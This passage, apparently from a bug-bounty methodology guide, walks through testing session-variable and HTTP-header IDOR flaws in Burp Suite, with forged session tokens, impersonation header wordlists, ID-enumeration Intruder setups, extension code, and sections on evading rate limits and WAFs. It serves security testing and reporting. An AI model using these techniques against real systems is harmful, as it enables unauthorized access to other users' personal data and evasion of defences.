#### **Burp Intruder - Cluster Bomb:**
```
Headers to test:
§X-User-ID§: §101§
§X-Original-User§: §102§
§X-Forwarded-For§: §103§
```

---

## 💥 **EXPLOITATION SCENARIOS** {#exploitation}

### **Scenario 1: Session-Based Account Takeover**

#### **Step-by-Step Exploitation:**

1. **Recon:**
```http
GET /api/user/settings HTTP/1.1
Cookie: session=eyJ1c2VySWQiOjEwMCwidXNlcm5hbWUiOiJ1c2VyMTAwIn0
```

2. **Decode session token:**
```bash
echo "eyJ1c2VySWQiOjEwMCwidXNlcm5hbWUiOiJ1c2VyMTAwIn0" | base64 -d
{"userId":100,"username":"user100"}
```

3. **Modify and re-encode:**
```bash
echo '{"userId":101,"username":"victim101"}' | base64
eyJ1c2VySWQiOjEwMSwidXNlcm5hbWUiOiJ2aWN0aW0xMDEifQ==
```

4. **Replace in Burp Repeater:**
```http
GET /api/user/settings HTTP/1.1
Cookie: session=eyJ1c2VySWQiOjEwMSwidXNlcm5hbWUiOiJ2aWN0aW0xMDEifQ==
```

### **Scenario 2: Session Variable in WebSocket**

#### **Using Burp WebSocket Editor:**

1. **Identify WebSocket connection:**
```javascript
var ws = new WebSocket("wss://example.com/chat");
ws.send(JSON.stringify({
    type: "auth",
    session: "user100_token",
    user_id: 100
}));
```

2. **Intercept WebSocket in Burp:**
   - Proxy > WebSockets history
   - Right-click > Send to Repeater

3. **Modify session data:**
```json
{
    "type": "auth",
    "session": "user100_token",
    "user_id": 101
}
```

### **Scenario 3: Session ID in GraphQL**

#### **Burp GraphQL Testing:**

1. **Intercept GraphQL request:**
```graphql
query {
  userProfile(sessionId: "abc123", userId: 100) {
    email
    creditCard
  }
}
```

2. **Modify variables:**
```graphql
query {
  userProfile(sessionId: "abc123", userId: 101) {
    email
    creditCard
  }
}
```

3. **Use GraphQL Playground in Burp to test variations**

---

## 📊 **AUTOMATION WITH BURP** {#automation}

### **Custom Python Script for Burp Extender**

```python
from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.util import ArrayList
import re

class BurpExtender(IBurpExtender, IScannerCheck):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Session IDOR Scanner")
        callbacks.registerScannerCheck(self)
        print("Session IDOR Scanner loaded")
        
    def doPassiveScan(self, baseRequestResponse):
        issues = ArrayList()
        
        # Analyze response for session variables
        response = baseRequestResponse.getResponse()
        response_str = self._helpers.bytesToString(response)
        
        # Look for session patterns
        patterns = [
            r'user[_-]id["\s:]+(\d+)',
            r'session[_-]id["\s:]+["\']([^"\']+)',
            r'data-user-id=["\'](\d+)',
            r'localStorage\.setItem\(["\']user_id["\'],\s*["\'](\d+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_str, re.IGNORECASE)
            if matches:
                print("Found potential session variable: " + str(matches))
                
        return issues
    
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # Active scanning logic
        test_payloads = ['101', '102', '999', '0', '-1']
        
        for payload in test_payloads:
            checkRequest = insertionPoint.buildRequest(payload)
            checkResponse = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest)
            
            # Analyze response
            if self._isSuccessful(checkResponse):
                return [self._createIssue(baseRequestResponse)]
        
        return None
    
    def _isSuccessful(self, checkResponse):
        response = checkResponse.getResponse()
        body = self._helpers.bytesToString(response)
        # Add logic to detect successful exploitation
        return False
    
    def _createIssue(self, baseRequestResponse):
        # Create scan issue
        return None
```

### **Burp Intruder Payload Generator**

```python
# Custom payload generator for session variables
from random import randint
import base64
import json

def generate_session_payloads():
    payloads = []
    
    # Numeric variations
    for i in range(1, 101):
        payloads.append(str(i))
    
    # Base64 encoded IDs
    for i in [100, 101, 102, 999]:
        encoded = base64.b64encode(str(i).encode()).decode()
        payloads.append(encoded)
    
    # JSON encoded
    for i in [100, 101, 999]:
        json_data = json.dumps({"user_id": i})
        payloads.append(json_data)
        payloads.append(base64.b64encode(json_data.encode()).decode())
    
    # Serialized PHP
    for i in [100, 101]:
        payloads.append('s:7:"user_id";i:{};'.format(i))
    
    return payloads
```

---

## 📝 **REPORTING TEMPLATE** {#reporting}

### **Finding: Session-Based IDOR Vulnerability**

```markdown
# Vulnerability Report: Session Variable IDOR

## Title
Session Variable Manipulation Leading to Unauthorized Data Access

## Severity
**High** - CVSS 3.1 Score: 8.2 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

## Affected Endpoint
`https://example.com/api/user/profile`

## Description
The application stores the current user's ID in a session cookie (`user_id`) and uses this value directly to fetch user data without verifying that the session token belongs to that user. This allows an attacker to modify the `user_id` cookie value to access other users' profiles.

## Steps to Reproduce

### Prerequisites
- Two user accounts: attacker@test.com (ID: 100) and victim@test.com (ID: 101)
- Burp Suite Community/Professional

### Reproduction Steps

1. **Login as attacker** (ID: 100) and intercept request:
```
GET /api/user/profile HTTP/1.1
Host: example.com
Cookie: session_id=abc123; user_id=100
```

2. **Send to Burp Repeater** (Ctrl+R)

3. **Modify the user_id cookie value**:
```
GET /api/user/profile HTTP/1.1
Host: example.com
Cookie: session_id=abc123; user_id=101
```

4. **Forward the request** and observe response:
```json
{
  "success": true,
  "data": {
    "id": 101,
    "email": "victim@test.com",
    "credit_card": "4111-1111-1111-1111",
    "address": "123 Victim St"
  }
}
```

### Proof of Concept (Screenshots)
[Attach screenshots showing]:
1. Original request with user_id=100
2. Modified request with user_id=101  
3. Response containing victim's data

### Impact
- **Confidentiality**: Unauthorized access to any user's personal data
- **Account Takeover**: Potential to reset passwords or modify profiles
- **Data Breach**: Mass extraction of user information possible through enumeration

### Remediation
1. **Server-side Authorization**: Always verify that the authenticated user (from session token) owns the requested resource
2. **Indirect References**: Use random, non-sequential identifiers
3. **Session Binding**: Bind user_id to session token server-side
4. **Input Validation**: Treat all user input as untrusted

### Affected Code
```php
// Vulnerable code
$user_id = $_COOKIE['user_id'];
$query = "SELECT * FROM users WHERE id = $user_id";

// Fixed code
$session_user_id = $_SESSION['authenticated_user_id'];
if ($session_user_id == $_COOKIE['user_id']) {
    $query = "SELECT * FROM users WHERE id = $session_user_id";
}
```

### Timeline
- **Discovery**: [Date]
- **Reported**: [Date]  
- **Acknowledged**: [Date]
- **Fixed**: [Date]
- **Bounty Paid**: [Amount]

### Additional Notes
This vulnerability affects all endpoints that reference the `user_id` cookie parameter. Similar issues were found in:
- `/api/user/settings`
- `/api/orders/list`
- `/api/messages/inbox`

### References
- OWASP: IDOR Prevention Cheat Sheet
- CWE-639: Authorization Bypass Through User-Controlled Key
- PortSwigger: Session-based IDOR vulnerabilities
```

---

## 🛡️ **DEFENSE EVASION TIPS**

### **Bypassing Rate Limits**

```python
# Turbo Intruder with delays
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False)
    
    for i in range(100, 200):
        engine.queue(target.req, str(i))
        time.sleep(1)  # 1 second delay between requests
```

### **IP Rotation via Burp Suite**
1. Use **Burp Collaborator** for blind detection
2. Configure **Project Options > Connections > SOCKS Proxy**
3. Rotate through proxy list

### **Request Randomization**
```http
# Add random parameters to avoid pattern detection
GET /api/profile?user_id=101&_=123456789
GET /api/profile?user_id=101&_=987654321
GET /api/profile?user_id=101&cache_bust=random123
```

---

## 🔧 **TROUBLESHOOTING COMMON ISSUES**

### **Issue 1: Session Variables Not Persisting**
**Solution:**
```python
# Ensure macro captures session correctly
Macro steps:
1. GET /login → Extract CSRF token
2. POST /login with credentials → Extract session cookie
3. GET /dashboard → Extract user_id
```

### **Issue 2: Application Using HTTPOnly Cookies**
**Solution:**
- Use Burp's **Session Handling Rules** to auto-modify
- Create custom **Session Handling Action**

### **Issue 3: Encrypted Session Data**
**Solution:**
1. Identify encryption pattern
2. Test with known plaintext attacks
3. Look for ECB mode vulnerabilities

---

## 📚 **RESOURCES & REFERENCES**

### **Burp Suite Extensions**
- **Session Token Analyzer**
- **JWT Editor**
- **Autorize**
- **Authz**
- **Turbo Intruder**
- **403 Bypasser**

### **Useful Commands**
```bash
# Decode common session formats
echo "dXNlcl9pZDoxMDE=" | base64 -d
echo -n '{"user_id":101}' | base64

# Extract cookies from Burp logs
cat burp_requests.log | grep -oP 'Cookie: \K[^\n]+'

# Generate session wordlist
seq 1 1000 > session_ids.txt
```

### **Practice Labs**
- PortSwigger: Session-based IDOR labs
- PentesterLab: Session Fixation exercises
- HackTheBox: JSON Web Token attacks

---

## ✅ **CHECKLIST**

### Pre-Testing
- [ ] Configure Burp proxy
- [ ] Install required extensions
- [ ] Create test accounts (minimum 2)
- [ ] Map all session storage locations
- [ ] Document session patterns

### Testing
- [ ] Test cookie modification
- [ ] Test JWT manipulation
- [ ] Test local/session storage
- [ ] Test hidden form fields
- [ ] Test WebSocket connections
- [ ] Test GraphQL variables
- [ ] Test race conditions

### Post-Testing
- [ ] Document all findings
- [ ] Create proof of concept
- [ ] Assess business impact
- [ ] Prepare remediation steps
- [ ] Submit report

---

# 🔍 **Complete Burp Suite Methodology for IDOR Technique #23: HTTP Headers**

## **Technique #23: HTTP Headers IDOR** - Testing IDOR vulnerabilities through custom HTTP headers

---

## 📋 **Understanding the Technique**

**What are HTTP Header IDORs?**
- Applications sometimes use custom headers for authorization or object references
- Headers like `X-User-ID`, `X-Forwarded-For`, `X-Original-User`, `X-Override-ID`, etc.
- Server may trust these headers without proper validation

**Common Vulnerable Headers:**
```
X-User-ID: 100
X-Impersonate: 100
X-Act-As: 100
X-Original-User: 100
X-Override-ID: 100
X-Forwarded-For: 192.168.1.100
X-Real-IP: 192.168.1.100
X-Proxy-User-ID: 100
X-Auth-User-ID: 100
X-User-Id-Override: 100
X-Role-ID: admin
```

---

## 🎯 **Phase 1: Reconnaissance & Header Discovery**

### **Step 1.1: Passive Header Discovery**

**Using Burp Proxy - Capture all requests:**
1. Configure browser to use Burp (127.0.0.1:8080)
2. Navigate through the application normally
3. Go to **Proxy → HTTP History**
4. Filter by extension (JS, CSS, Images excluded)
5. Look for interesting headers in:
   - Request headers
   - Response headers
   - Custom header patterns

**Burp Filter Setup:**
```
Filter by MIME type: HTML, JSON, XML, Text
Show only: Parameterful requests
Hide: CSS, Images, Fonts
```

### **Step 1.2: Header Enumeration with Burp Intruder**

**Create Header Wordlist:**
Save this as `headers.txt`:
```
X-User-ID
X-User-Id
X-UID
X-Uid
X-UserID
X-UserId
X-Auth-ID
X-Auth-Id
X-AuthUser
X-Auth-User
X-Original-User
X-OriginalUser
X-Impersonate
X-Impersonation
X-Act-As
X-ActAs
X-On-Behalf-Of
X-Override-ID
X-Override
X-Proxy-User
X-Proxy-ID
X-Real-User
X-Real-ID
X-Forwarded-User
X-Forwarded-ID
X-Remote-User
X-Remote-ID
X-API-User
X-API-ID
X-Access-User
X-Access-ID
X-App-User
X-App-ID
X-Client-ID
X-Client-User
X-Consumer-ID
X-Consumer-Username
X-Credentials-ID
X-Identity
X-JWT-Subject
X-Impersonate-User
X-Masquerade
X-User-Email
X-Account-ID
X-Customer-ID
X-Member-ID
X-Profile-ID
X-Employee-ID
X-Admin-ID
X-Role-ID
X-Permission-User
X-Delegated-User
X-Switch-User
X-Original-Email
X-Auth-Email
X-User-Override
X-ID-Override
```

**Intruder Attack Setup:**
1. Select a baseline request
2. Right-click → **Send to Intruder**
3. Positions tab → Clear §
4. Add payload position in headers section:
```
GET /api/user/profile HTTP/1.1
Host: target.com
§X-Test-Header§: 100
Cookie: session=abc123
```

5. **Payloads tab:**
   - Payload type: Simple list
   - Load `headers.txt`
   - Add suffix: `: 100` (or load with values pre-added)

6. **Settings tab:**
   - **Grep - Match**: Add strings to identify potential successes:
     - "profile"
     - "user data"
     - "email"
     - "admin"
     - "200 OK"
     - content-length differences

### **Step 1.3: Spidering for Header Patterns**

**Using Burp Spider/Scanner:**
1. Target tab → Right-click domain → **Spider this host**
2. Enable: "Spider form inputs"
3. After spidering, check:
   - **Target → Site map**
   - Look for requests with custom headers
   - Note patterns in header usage

---

## 🔍 **Phase 2: Identifying Valid User IDs**

### **Step 2.1: ID Gathering from Responses**

**Using Burp Extractor:**
1. Navigate through application authenticated as User A
2. Look for ID leaks in:
   - JSON responses
   - HTML comments
   - JavaScript variables
   - Hidden form fields
   - Meta tags

**Burp Match and Replace for Auto-Capture:**
1. Go to **Proxy → Options → Match and Replace**
2. Add rule:
   - Match: `"user_id":(\d+)`
   - Replace: `"user_id":$1 [FOUND]`
   - This highlights IDs in responses

### **Step 2.2: Create ID Wordlist**

From your observations, create `ids.txt`:
```
101
102
103
1001
1002
admin
administrator
test
```

**Using Burp Intruder for ID Enumeration:**
1. Find an endpoint that returns user data (e.g., `/api/user/profile`)
2. Send to Intruder
3. Set position in header value: `X-User-ID: §100§`
4. Payload: Numbers from 1-1000
5. **Grep Extract**: Configure to extract:
   - Response length
   - Status codes
   - Keywords like "email", "name", "role"

---

## 🧪 **Phase 3: Testing Methodology**

### **Step 3.1: Baseline Testing**

**Create Two User Accounts:**
- User A (attacker) - ID: 100
- User B (victim) - ID: 101

**Baseline Request (as User A):**
```http
GET /api/user/profile HTTP/1.1
Host: target.com
Cookie: session=USER_A_SESSION
```

**Modified Request with Header:**
```http
GET /api/user/profile HTTP/1.1
Host: target.com
X-User-ID: 101
Cookie: session=USER_A_SESSION
```

### **Step 3.2: Burp Repeater Manual Testing**

**Workflow in Repeater:**
1. Capture authenticated request
2. Right-click → **Send to Repeater**
3. Add one header at a time
4. Try combinations:

**Test Sequence:**
```http
# Test 1: Add single header
X-User-ID: 101

# Test 2: Try different header names
X-Auth-User: 101

# Test 3: Try with original header removed
[Remove original auth headers]
X-Override-ID: 101

# Test 4: Try with multiple headers
X-Original-User: 101
X-Real-User: 101

# Test 5: Try with different ID formats
X-User-ID: 101
X-User-ID: "101"
X-User-ID: 0x65
X-User-ID: 0145
```

### **Step 3.3: Burp Intruder Automated Testing**

**Attack Type: Pitchfork (multiple payload positions)**

**Request Template:**
```http
GET /api/user/profile HTTP/1.1
Host: target.com
§X-User-ID§: §101§
§X-Original-User§: §101§
Cookie: session=USER_A_SESSION
```

**Payload Sets:**
- Set 1: Header names (from headers.txt)
- Set 2: User IDs (from ids.txt)

**Settings:**
- Resource pool: 1 thread (to avoid rate limiting)
- Retries: 2
- Throttle between requests: 200ms

---

## 🎨 **Phase 4: Advanced Testing Techniques**

### **Step 4.1: Header Priority Testing**

Test header precedence when multiple exist:

**Burp Intruder - Cluster Bomb:**
```http
GET /api/user/profile HTTP/1.1
Host: target.com
X-User-ID: §100§
X-Original-User: §101§
X-Override-ID: §102§
Cookie: session=USER_A_SESSION
```

Analyze which header takes precedence.

### **Step 4.2: Header Injection Variations**

**Case Manipulation:**
```
x-user-id: 101
X-User-Id: 101
X-USER-ID: 101
```

**Whitespace Variations:**
```
X-User-ID:101
X-User-ID: 101
X-User-ID:    101
X-User-ID: 101 [space at end]
```

**Encoding:**
```
X-User-ID: %31%30%31
X-User-ID: 101%00
X-User-ID: 101%0d%0a
```

### **Step 4.3: Chained Header Attacks**

**Test with other IDOR locations:**

```http
GET /api/user/§100§/profile HTTP/1.1
Host: target.com
X-User-ID: §101§
Cookie: session=USER_A_SESSION
```

This tests if header overrides URL parameter.

---

## 🤖 **Phase 5: Using Burp Extensions**

### **Step 5.1: Install Essential Extensions**

**Via BApp Store:**
1. **Autorize** - Automates authorization tests
2. **Authz** - Test with different credentials
3. **Headhunter** - Security header analyzer
4. **Paramalyzer** - Track parameters across requests
5. **Turbo Intruder** - High-speed brute forcing

### **Step 5.2: Autorize Configuration**

1. Install Autorize extension
2. Configure with two sessions:
   - Low privilege user (attacker)
   - High privilege user (victim)
3. **Auto-test headers:**
   - Enable "Add headers to requests"
   - Add your test headers
4. Run and check for:
   - Bypassed endpoints
   - Forced browsing successes

### **Step 5.3: Custom Extension - Header Fuzzer**

Create a simple Python extension for Burp:

```python
from burp import IBurpExtender, IIntruderPayloadGeneratorFactory, IIntruderPayloadGenerator
from java.util import List, ArrayList
import random

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Header IDOR Fuzzer")
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        print("Header IDOR Fuzzer loaded")
    
    def getGeneratorName(self):
        return "Header IDOR Payloads"
    
    def createNewInstance(self, attack):
        return HeaderIDORGenerator()
    
class HeaderIDORGenerator(IIntruderPayloadGenerator):
    def __init__(self):
        self.headers = [
            "X-User-ID", "X-Auth-ID", "X-Original-User", 
            "X-Impersonate", "X-Act-As", "X-Override-ID"
        ]
        self.ids = [101, 102, 103, 1001, 1002]
        self.index = 0
        self.max = len(self.headers) * len(self.ids)
    
    def hasMorePayloads(self):
        return self.index < self.max
    
    def getNextPayload(self, baseValue):
        header_index = self.index / len(self.ids)
        id_index = self.index % len(self.ids)
        payload = "%s: %s" % (self.headers[header_index], self.ids[id_index])
        self.index += 1
        return payload
    
    def reset(self):
        self.index = 0
```

---

## 📊 **Phase 6: Analysis & Validation**

### **Step 6.1: Response Analysis in Burp**

**Filtering Results:**
1. Go to Intruder → Results
2. Sort by:
   - Status code (200 vs 403)
   - Response length (anomalies)
   - Response time (potential timing attacks)

**Grep Extract Configuration:**
Add these patterns to extract:
```regex
"email":"([^"]+)"
"role":"([^"]+)"
"id":(\d+)
"name":"([^"]+)"
```

### **Step 6.2: Manual Validation**

For each promising result:
1. Right-click → **Send to Repeater**
2. Compare with:
   - Legitimate request as User A
   - Legitimate request as User B
3. Check for:
   - Data exposure
   - Functionality access
   - State changes

### **Step 6.3: Impact Assessment**

**Check for:**
- PII exposure (email, phone, address)
- Financial data
- Administrative functions
- Ability to modify data
- Account takeover potential

---

## 🛡️ **Phase 7: Bypassing Protections**

### **Step 7.1: Rate Limiting Bypass**

**Using Burp Intruder with Throttling:**
```
Settings → Resource pool → 
- Maximum concurrent requests: 1
- Delay between requests: 1000-5000ms
```

**IP Rotation via Headers:**
```http
X-Forwarded-For: 192.168.1.§100§
X-Real-IP: 10.0.0.§100§
X-Original-IP: 172.16.0.§100§
```

### **Step 7.2: WAF Bypass Techniques**

**Header Obfuscation:**
```
X-User-@ID: 101
X-User-Id: 101
X-User-!D: 101
X-User_-ID: 101
```

**Case Randomization:**
```python
import random
header = "X-User-ID"
obfuscated = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in header)
```

### **Step 7.3: Session/Header Combinations**

**Test if header works without session:**
```http
GET /api/user/profile HTTP/1.1
Host: target.com
X-User-ID: 101
[No Cookie header]
```

**Test if header overrides session:**
```http
GET /api/user/profile HTTP/1.1
Host: target.com
X-User-ID: 101
Cookie: session=USER_A_SESSION
```

---

## 📝 **Phase 8: Reporting**

### **Step 8.1: Capture Evidence in Burp**

1. **Request/Response pairs:**
   - Right-click → **Save item**
   - Include both successful and baseline requests

2. **Screenshots:**
   - Burp Repeater showing request/response
   - Comparison of User A vs User B data

3. **Generate Report:**
   - Select findings
   - Right-click → **Report selected issues**
   - HTML format with evidence

### **Step 8.2: Documentation Template**

```
## Vulnerability: HTTP Header IDOR

### Endpoint
https://target.com/api/user/profile

### Headers Tested
X-User-ID: 101

### Original Request (User A - ID: 100)
[PASTE REQUEST]
[PASTE RESPONSE - User A's data]

### Exploit Request
[PASTE REQUEST with modified header]
[PASTE RESPONSE - User B's data]

### Impact
- Access to User B's personal information
- [Specific data exposed]

### Remediation
- Validate user permissions server-side
- Do not trust client-supplied headers
- Implement proper session validation
```

---

## 🎯 **Quick Reference Checklist**

```
[ ] Configure Burp Proxy
[ ] Create two test accounts
[ ] Gather baseline requests
[ ] Create header wordlist
[ ] Create ID wordlist
[ ] Run Intruder attacks
[ ] Install relevant extensions
[ ] Manual Repeater testing
[ ] Analyze responses
[ ] Validate findings
[ ] Document with evidence
[ ] Check for chaining possibilities
[ ] Test bypass techniques
[ ] Prepare final report
```

---

## 🚨 **Pro Tips**

1. **Session Management:** Keep two browser sessions logged in as different users for quick comparison

2. **Macros in Burp:** Create macros to automatically refresh tokens/sessions during long intruder attacks

3. **Scope Configuration:** Always set target scope to avoid attacking unintended hosts

4. **Resource Pools:** Use different resource pools for different attack types to manage concurrency

5. **Match/Replace Rules:** Create rules to automatically add test headers to all requests

6. **Session Handling Rules:** Configure rules to handle CSRF tokens and session renewal

7. **Extensions Worth Installing:**
   - **JSON Web Tokens** - For JWT manipulation
   - **Logger++** - Advanced logging
   - **Copy as Python-Requests** - For proof-of-concept scripts

---

## ⚠️ **Important Considerations**

- Always work within authorized scope
- Be careful not to modify data during testing
- Document rate limits and respect them
- Test in non-production environments first
- Verify findings multiple times
- Consider privacy implications when accessing user data

---

# 🔍 **Bug #24: HTTP Headers IDOR - Complete Burp Suite Methodology**

## 📋 **Bug Description**
**IDOR vulnerability in HTTP Headers** - When object references are passed through custom HTTP headers instead of traditional parameters (URL, POST body, etc.)

---

## 🎯 **Common Vulnerable Headers**

### **Authentication/Authorization Headers**
```
X-User-ID: 100
X-User-Id: 100
X-User: 100
X-UID: 100
X-Account-ID: 100
X-Customer-ID: 100
X-Profile-ID: 100
X-Impersonate: 100
X-On-Behalf-Of: 100
X-Act-As: 100
X-Original-User: 100
```

### **Debug/Testing Headers**
```
X-Debug-User: 100
X-Test-User: 100
X-Admin-User: 100
X-Bypass-User: 100
X-Forwarded-User: 100
X-Original-User: 100
X-Impersonating: 100
X-Run-As: 100
```

### **Proxy/Forward Headers**
```
X-Forwarded-For: 127.0.0.1 (with user context)
X-Real-IP: 127.0.0.1 (with user context)
X-Original-For: 127.0.0.1
Forwarded: for=192.0.2.60;proto=http;by=203.0.113.43
```

### **Application-Specific Headers**
```
X-App-User: 100
X-Organization: 100
X-Team-ID: 100
X-Role-ID: 100
X-Group-ID: 100
X-Department-ID: 100
X-Company-ID: 100
X-Workspace-ID: 100
X-Project-ID: 100
```

---

## 🛠️ **Phase 1: Reconnaissance & Discovery**

### **Step 1.1: Spider/Crawl the Application**
1. Configure Burp Spider:
   ```
   Target → Site map → Right-click → Spider this host
   Check: "Spider form submissions"
   Check: "Spider pause options"
   ```

2. Use Burp Scanner for passive crawl:
   ```
   Target → Site map → Right-click → Active Scan
   Enable: "Passive crawl only"
   ```

### **Step 1.2: Parameter Discovery with Burp Extensions**

**Install these extensions (Extender → BApp Store):**
- **Param Miner** - Discovers hidden parameters
- **Head3rs** - Tests for header-based vulnerabilities
- **Autorize** - Tests authorization Bypass
- **Authz** - Tests authorization checks
- **Logger++** - Advanced logging

**Configure Param Miner for headers:**
```
Right-click request → Extensions → Param Miner → 
Select: "Guess headers"
Select: "Add cache-buster"
Select: "Add dynamic values"
```

### **Step 1.3: Analyze Traffic Patterns**

**Use Burp Filter to identify header patterns:**
```
Filter by: "Extensions" → .js, .css (exclude)
Filter by: "Status code" → 200, 302
Search for: "X-" in Headers tab
Search for: "User" in Headers tab
Search for: "ID" in Headers tab
```

**Logger++ Configuration:**
```
Add columns: URL, Method, Status, Request Headers, Response Headers
Filter: request_headers contains "X-" OR "User" OR "ID"
Export results for analysis
```

---

## 🔍 **Phase 2: Mapping the Attack Surface**

### **Step 2.1: Identify User-Specific Endpoints**

**Use Burp Intruder to find user-context endpoints:**

1. **Create a wordlist of potential user-specific paths:**
```
/profile
/account
/dashboard
/settings
/preferences
/orders
/invoices
/messages
/notifications
/documents
/files
/photos
/api/user
/api/account
/api/profile
/api/customer
/api/member
```

2. **Configure Intruder attack:**
```
Target: https://example.com
Position: §/profile§
Payloads: Load path wordlist
Options → Grep Extract: Add "user", "profile", "account", "id"
```

### **Step 2.2: Identify Header Usage**

**Use Burp Repeater to test each endpoint:**

1. **Capture a baseline request:**
   - Intercept a normal request
   - Send to Repeater (Ctrl+R)

2. **Test adding headers:**
   ```http
   GET /api/profile HTTP/1.1
   Host: example.com
   X-User-ID: 100
   Cookie: session=abc123
   ```

3. **Check for differences:**
   - Response status changes
   - Response body changes
   - Response time changes
   - Error messages

### **Step 2.3: Use Autorize Extension**

1. **Configure Autorize:**
   ```
   Right-click → Extensions → Autorize → Send to Autorize
   Set low privilege user cookies
   Set high privilege user cookies
   Enable: "Auto scan"
   ```

2. **Interpret results:**
   - **Red** = Definitely vulnerable
   - **Yellow** = Potentially vulnerable
   - **Green** = Protected

---

## 🧪 **Phase 3: Manual Testing Methodology**

### **Step 3.1: Baseline Request Capture**

**Create two test accounts:**
- **User A** (victim): ID 100, username: victim@test.com
- **User B** (attacker): ID 101, username: attacker@test.com

**Capture requests for each:**
```
1. Login as User A
2. Perform actions (view profile, load dashboard)
3. Copy all requests to Burp

4. Login as User B
5. Perform same actions
6. Copy all requests
```

### **Step 3.2: Header Fuzzing Strategy**

**Create a comprehensive header wordlist:**

```python
# generate_headers.py
headers = [
    # User identification
    "X-User-ID", "X-User-Id", "X-UserId", "X-UID", "X-Uid",
    "X-Customer-ID", "X-Customer-Id", "X-CustomerID",
    "X-Account-ID", "X-Account-Id", "X-AccountID",
    "X-Profile-ID", "X-Profile-Id", "X-ProfileID",
    "X-Member-ID", "X-Member-Id", "X-MemberID",
    
    # Impersonation
    "X-Impersonate", "X-Impersonating", "X-Impersonation",
    "X-Act-As", "X-On-Behalf-Of", "X-Behalf",
    "X-Run-As", "X-Sudo", "X-Sudo-As",
    "X-Switch-User", "X-Switch-To", "X-Original-User",
    
    # Debug/Dev
    "X-Debug-User", "X-Test-User", "X-Dev-User",
    "X-Bypass-User", "X-Bypass-Auth", "X-Override-User",
    "X-Admin-User", "X-Admin-Mode", "X-Dev-Mode",
    
    # Proxy/Forward
    "X-Forwarded-User", "X-Forwarded-For", "X-Real-IP",
    "X-Original-For", "X-Original-User", "Forwarded",
    
    # Application specific
    "X-App-User", "X-App-UID", "X-Application-User",
    "X-Org-ID", "X-Organization-ID", "X-Company-ID",
    "X-Team-ID", "X-Group-ID", "X-Department-ID",
    "X-Role-ID", "X-Workspace-ID", "X-Project-ID",
    "X-Tenant-ID", "X-Client-ID", "X-Instance-ID",
    
    # Authentication
    "X-Auth-User", "X-Auth-UID", "X-Authenticated-User",
    "X-Authorization-User", "X-Auth-ID",
    
    # Session
    "X-Session-User", "X-Session-ID-User",
    
    # Variations
    "User-ID", "UserId", "UID", "CustomerID",
    "AccountID", "ProfileID", "MemberID",
    "Impersonate", "Acting-As", "Run-As",
    
    # With underscores
    "X_USER_ID", "X_USERID", "X_UID",
    "X_CUSTOMER_ID", "X_ACCOUNT_ID",
    
    # Colon variations
    "X-User-ID:", "X-User-ID :",
    
    # Case variations
    "x-user-id", "X-User-Id", "X-USER-ID",
    "X-User-Id", "x-USER-ID",
    
    # Number variations
    "X-User-ID-1", "X-User-ID-2", "X-User-ID-3",
    "X-User-ID-Header", "X-User-ID-Value",
    
    # Combined with numbers
    "X-User-100", "X-UserId-100", "X-UID-100",
    
    # Common patterns from other apps
    "X-Moodle-User", "X-WordPress-User", "X-Drupal-User",
    "X-Joomla-User", "X-Shopify-User", "X-Salesforce-User",
    "X-SAP-User", "X-Oracle-User", "X-Microsoft-User",
]

with open('headers.txt', 'w') as f:
    for header in headers:
        f.write(f"{header}\n")
```

### **Step 3.3: Burp Intruder Configuration**

**Setup Intruder for header fuzzing:**

1. **Prepare the request:**
   ```http
   GET /api/profile HTTP/1.1
   Host: example.com
   §X-User-ID§: §100§
   Cookie: [attacker_session]
   ```

2. **Payload Positions:**
   - Position 1: Header name (from wordlist)
   - Position 2: Header value (incrementing IDs)

3. **Payload Sets:**
   ```
   Payload set 1: Simple list → headers.txt
   Payload set 2: Numbers → 1-1000 (step 1)
   ```

4. **Attack Types:**
   - **Cluster bomb** (for name+value combinations)
   - **Sniper** (for testing single header variations)

5. **Resource Pool:**
   - Set to 5-10 threads (avoid rate limiting)
   - Add delays between requests

### **Step 3.4: Advanced Intruder Setup**

**Use Grep Extract to detect successful IDOR:**

1. **Configure Grep Extract:**
   ```
   Intruder → Options → Grep Extract
   Add: Extract user-specific data
   Regex: "user_id":\s*"(\d+)"
   Regex: "email":\s*"([^"]+)"
   Regex: "username":\s*"([^"]+)"
   ```

2. **Configure Grep Match:**
   ```
   Add matches for:
   - "unauthorized"
   - "forbidden"
   - "permission denied"
   - "access denied"
   - "not allowed"
   ```

3. **Add response length analysis:**
   ```
   Options → Response Length
   Check: "Compare with baseline"
   ```

### **Step 3.5: Manual Testing Checklist**

**Test each endpoint systematically:**

```markdown
## Endpoint: /api/user/profile

### Test 1: Direct header addition
- [ ] Add X-User-ID: 100 (victim ID)
- [ ] Compare with own profile (ID 101)
- [ ] Check for data exposure

### Test 2: Header replacement
- [ ] Remove all auth headers
- [ ] Add only X-User-ID: 100
- [ ] Check if authentication is bypassed

### Test 3: Header combinations
- [ ] X-User-ID: 100 + Cookie: [attacker]
- [ ] X-Original-User: 100 + Cookie: [attacker]
- [ ] X-Impersonate: 100 + Cookie: [attacker]

### Test 4: Invalid values
- [ ] X-User-ID: 999999 (non-existent)
- [ ] X-User-ID: 0
- [ ] X-User-ID: -1
- [ ] X-User-ID: "admin"
- [ ] X-User-ID: null
- [ ] X-User-ID: true

### Test 5: Format variations
- [ ] X-User-ID: 100.0 (float)
- [ ] X-User-ID: 0x64 (hex)
- [ ] X-User-ID: 0144 (octal)
- [ ] X-User-ID: 100%00 (null byte)
```

---

## 📊 **Phase 4: Advanced Testing Techniques**

### **Step 4.1: Parameter Pollution in Headers**

**Test multiple headers:**
```http
GET /api/profile HTTP/1.1
Host: example.com
X-User-ID: 101
X-User-ID: 100
X-Original-User: 100
X-Impersonate: 100
Cookie: [attacker_session]
```

**Test with duplicates:**
```http
X-User-ID: 101
X-User-ID: 100
```
